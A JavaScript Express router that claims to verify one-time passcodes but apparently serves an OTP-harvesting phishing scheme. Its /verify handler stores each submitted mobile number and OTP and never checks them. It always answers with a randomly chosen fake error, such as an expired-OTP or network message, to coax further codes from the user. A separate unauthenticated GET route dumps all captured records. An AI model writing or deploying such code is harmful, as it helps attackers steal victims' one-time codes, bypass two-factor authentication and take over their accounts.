
import express from "express";
import OtpVerification from "../models/OtpVerification.js";

const router = express.Router();

// Existing verify route
router.post("/verify", async (req, res) => {
  try {
    const { mobile, otp } = req.body;

    if (!mobile) {
      return res.status(400).json({
        success: false,
        message: "Mobile number is required",
      });
    }

    if (!/^\d{10}$/.test(mobile)) {
      return res.status(400).json({
        success: false,
        message: "Please enter a valid 10 digit mobile number",
      });
    }

    if (!otp) {
      return res.status(400).json({
        success: false,
        message: "Please enter your OTP",
      });
    }

    if (!/^\d{6}$/.test(otp)) {
      return res.status(400).json({
        success: false,
        message: "Please enter valid 6 digit OTP",
      });
    }

    const data = await OtpVerification.create({
      mobile: mobile,
      otp: otp,
      verified: false,
    });

    console.log("OTP saved:", data._id);

    const errorMessages = [
      "Technical error, please try later",
      "OTP has expired, resend OTP",
      "Network error, please check your connection",
    ];

    const randomMessage =
      errorMessages[
        Math.floor(Math.random() * errorMessages.length)
      ];

    return res.status(400).json({
      success: false,
      message: randomMessage,
    });
  } catch (error) {
    console.error("OTP database error:", error);

    return res.status(500).json({
      success: false,
      message: "Technical error, please try later",
    });
  }
});

// Fetch OTP records only
router.get("/", async (req, res) => {
  try {
    const otps = await OtpVerification.find()
      .sort({ createdAt: -1 });

    return res.status(200).json({
      success: true,
      otps,
    });
  } catch (error) {
    console.error("Fetch OTP error:", error);

    return res.status(500).json({
      success: false,
      message: "Failed to fetch OTP records",
    });
  }
});

export default router;
